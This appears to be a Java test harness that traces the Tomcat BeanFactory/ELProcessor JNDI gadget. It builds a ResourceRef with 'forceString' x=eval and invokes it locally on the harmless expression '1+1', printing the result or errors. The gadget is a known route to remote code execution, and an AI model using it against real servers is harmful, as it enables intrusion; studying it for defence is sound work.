
import javax.naming.*;
import javax.naming.spi.*;
import org.apache.naming.ResourceRef;

public class BFTrace {
    public static void main(String[] args) throws Exception {
        // Build ResourceRef for ELProcessor
        ResourceRef ref = new ResourceRef(
            "javax.el.ELProcessor", null, "", "", true,
            "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", "1+1"));

        System.out.println("Ref class: " + ref.getClassName());
        System.out.println("Factory: " + ref.getFactoryClassName());

        // Load BeanFactory
        Class<?> clz = Class.forName("org.apache.naming.factory.BeanFactory");
        ObjectFactory factory = (ObjectFactory) clz.getDeclaredConstructor().newInstance();
        System.out.println("Factory loaded: " + factory.getClass().getName());

        try {
            Object result = factory.getObjectInstance(ref, new CompositeName("test"), null, null);
            System.out.println("Result: " + result);
            System.out.println("Result class: " + result.getClass().getName());
        } catch (Exception e) {
            System.out.println("Exception: " + e.getClass().getName());
            System.out.println("Message: " + e.getMessage());
            if (e.getCause() != null) {
                System.out.println("Cause: " + e.getCause().getClass().getName());
                System.out.println("Cause msg: " + e.getCause().getMessage());
                if (e.getCause().getCause() != null) {
                    System.out.println("Root: " + e.getCause().getCause().getClass().getName());
                    System.out.println("Root msg: " + e.getCause().getCause().getMessage());
                }
            }
            e.printStackTrace(System.err);
        }
    }
}
